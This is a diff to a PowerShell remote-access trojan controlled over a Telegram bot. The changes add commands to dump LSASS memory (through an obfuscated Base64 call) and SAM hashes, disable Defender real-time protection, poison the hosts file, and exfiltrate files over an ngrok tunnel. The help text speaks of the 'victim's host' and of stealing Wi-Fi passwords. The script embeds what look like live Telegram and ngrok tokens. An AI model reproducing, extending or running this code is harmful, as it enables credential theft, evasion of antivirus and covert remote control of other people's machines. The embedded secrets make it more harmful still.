@@ -3,7 +3,7 @@ function run-asAdmin($path,$password)
 {
     if (is-administartor)
     {
-        return "alredy run as admin."
+        return "alredy ru as admin."
     }
     $vbscript = @('set WshShell = WScript.CreateObject("WScript.Shell")'
     'WshShell.Run "cmd"'
@@ -196,8 +196,14 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
 
                 ElseIf($command.contains('get dump lsass file'))
                 {
-                    $output = get-lssasDump
-                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken   
+                    if((is-administartor) -eq $false)
+                    {
+                        Send-data -data "Command must be exicuted as admin" -chat_id $chat_id -apiToken $apiToken 
+                    }
+                    else{
+                        $output = get-lssasDump
+                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken 
+                    }  
                 }
 
                 ElseIf($command.contains('force run as admin -p'))
@@ -210,16 +216,57 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
                 }
                 ElseIf($command.contains('get dump sam file'))
                 {
-                    $output = dump-sam
-                    foreach($i in $output)
+                    if((is-administartor) -eq $false)
                     {
-                        Send-data -data $i -chat_id $chat_id -apiToken $apiToken  
+                        Send-data -data "Command must be exicuted as admin" -chat_id $chat_id -apiToken $apiToken 
+                    }
+                    else{
+                        $output = dump-sam
+                        foreach($i in $output)
+                        {
+                            Send-data -data $i -chat_id $chat_id -apiToken $apiToken  
+                        }
                     }
                 }
                 ElseIf($command.contains('disable real time protecion'))
                 {
                     $output = disable-protection
                     Send-data -data $output -chat_id $chat_id -apiToken $apiToken 
+                }
+                ElseIf($command.contains('route dns host -h'))
+                    {
+                        $hostd = ($command.Replace("route dns host -h",'')).split('-d')[0].Trim()
+                        $domain = ($command.Replace("route dns host -h",'')).split('-d')[-1].Trim()
+                        $output = mod-host -hostd $hostd -domain $domain
+                        echo $output
+                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken
+                    }
+                ElseIf($command.contains('get file -p'))
+                {
+                    $path = ($command.Replace("get file -p",'')).Trim()
+                    $urlToNG = Get-ngrokToken
+                    if ($urlToNG -eq $false)
+                    {
+                        Send-data -data "failed to extract ngrok url try again later" -chat_id $chat_id -apiToken $apiToken 
+                    }
+                    else{
+                        $output = get-file -path $path -urlToNG $urlToNG
+                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken
+                    }
+                }
+                ElseIf($command.contains('get real time protection status'))
+                {
+                    if (IsMonitoring-Disable){
+                        Send-data -data "Real time protection is disable!" -chat_id $chat_id -apiToken $apiToken
+                    }
+                    else{
+                        Send-data -data "Real-time protection is enabled -_-" -chat_id $chat_id -apiToken $apiToken
+                    }
+                }
+                ElseIf(([string]$command.Trim()) -like "-help")
+                {
+                    $output = get-MyHelp
+                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                 }
                 else{
                     $output = Excmd $command
@@ -301,13 +348,25 @@ function Start-JupShell($port,$pathToNg,$token)
 
 
 
-function ismodified($hostd,$domain)
+function mod-host($hostd,$domain)
 {
     $cont = Get-Content "C:\Windows\System32\drivers\etc\hosts"
     if (-not("$hostd $domain" -in $cont))
     {
-        echo "`n$hostd $domain" >> "C:\Windows\System32\drivers\etc\hosts"
+        try
+        {
+            echo "`n$hostd $domain" >> "C:\Windows\System32\drivers\etc\hosts"
+            return 'Successfully completed'
+        }
+        catch{
+            if (is-administartor)
+            {
+                return "Failed to execute the command -_-"
+            }
+        }   return 'The command must be executed with admin permission.'
     }
+    return "already exist in hosts file"
+    return "$hostd $domain already exist in hosts file"
 }
 
 function Add-Run
@@ -346,9 +405,12 @@ function is-administartor
     return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-
 function get-file($path,$urlToNG)
 {
+    if(([System.IO.File]::Exists($path)) -eq $false)
+    {
+        return "File doesn't exist"
+    }
     $file = Get-Item $path
     $basename = $file.basename + $file.Extension
     $path = $file.DirectoryName
@@ -368,7 +430,9 @@ function get-lssasDump
     $res = $res.tunnels ; $urll = $res.public_url
     try
     {
-       $test = procdump -ma lsass.exe C:\ngrok\lssass.dmp | out-string
+        $Base64String = 'cHJvY2R1bXAgLW1hIGxzYXNzLmV4ZSBDOgpncm9rXGxzc2Fzcy5kbXAgfCBvdXQtc3RyaW5n'
+        $commt = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Base64String))
+        $test = Invoke-Expression -Command $commt
        if($test.contains('Access is denied'))
        {
            return 'Error while trying to creat dump file. "access denied"'
@@ -394,7 +458,7 @@ function dump-sam{
     $ngrokUrl = get-ngrokToken
     $files = @()
     try{
-        remove-item C:\ngrok\dumps -Recurse | out-null
+        remove-item C:\ngrok\dumps -Recurse -ErrorAction SilentlyContinue| out-null
         mkdir C:\ngrok\dumps | out-null
     }
     catch{
@@ -415,7 +479,7 @@ function IsMonitoring-Disable
 
 function disable-protection
 {
-    if (is-administartor -like $false)
+    if ((is-administartor) -eq $false)
     {
         return "Program must run as admin."
     }
@@ -424,7 +488,8 @@ function disable-protection
         return "Real time protection is alredy Disable."
     }
     try{
-        $testDisable
+        
+        $testDisable = Set-MpPreference -DisableRealtimeMonitoring $true
         if ($testDisable -eq $null)
         {
             return "Successfully completed"
@@ -434,9 +499,52 @@ function disable-protection
     }
 }
 
+function get-MyHelp
+{
+    $help = @(
+    "You are able to run normal commands on the victim's host, however there are several built-in commands to gain additional insights."
+    "---------------------------------------------------------------"
+    "[+] get wifi passwords" 
+    "Description: Steal Wifi passwords" 
+    "`n"
+    "[+] save password as clear text"  
+    "Description: Save all new logon lsass passwords as in clear text (Used to help dump lsass)"
+    "`n"
+    "[+] get dump lsass file  Description:" 
+    "Gather lsass passwords for all users" 
+    "`n"
+    "[+] force run as admin -p <password>  "
+    "Description: Run VBS script to forcelly run as admin with password (Ex. 'force run as admin -p 1234')"
+    "`n"
+    "[+] get dump lsass file " 
+    "Description: Gather all lsass passwords and credentials for all users including Kerberos tickes"
+    "`n"
+    "[+] get dump sam file"  
+    "Description: Gather all logon passwords hashes for all users "
+    "`n"
+    "[+] disable real time protecion"  
+    "Description: Might require external premissions"
+    "`n"
+    "[+] route dns host -h <host> -d <domain> " 
+    "Description: Modify the hosts file to overwright IP to a selected domain (DNS poisining)"
+    "`n"
+    "[+] get file -p <path> " 
+    "Description: Generate Ngrok URL for a file in the host (Requires full file path)"
+    "`n"
+    "[+] get real time protection status"  
+    "Description: Check if Real time Protection is Enable/Disable"
+    )
+    $helhelp
+    foreach($i in $help)
+    {
+        $helhelp+="$i`n"
+    }
+    return $helhelp
+}
+
 function savePassword-clearText
 {
-    if (-not(is-administartor))
+    if ((is-administartor)-eq $false)
     {
         return "Must run as admin"
     }
@@ -455,15 +563,13 @@ Set-Location C:\
 try
 {
     $path_to_ngrok = "C:\ngrok\ngrok.exe"
-    if([System.IO.File]::Exists($path_to_ngrok) -like $false)
+    if(([System.IO.File]::Exists($path_to_ngrok)) -eq $false)
     {
         mkdir C:\ngrok
         Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
-        Expand-Archive .\ngrok.zip
-        ngrok config add-authtoken 29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR
+        Expand-Archive C:\ngrok\ngrok.zip -Destination C:\ngrok
+        ngrok config add-authtoken "29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR"
     }
-
-
     $urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
 }
 catch{
@@ -473,5 +579,4 @@ catch{
 $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
 start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG
-
 
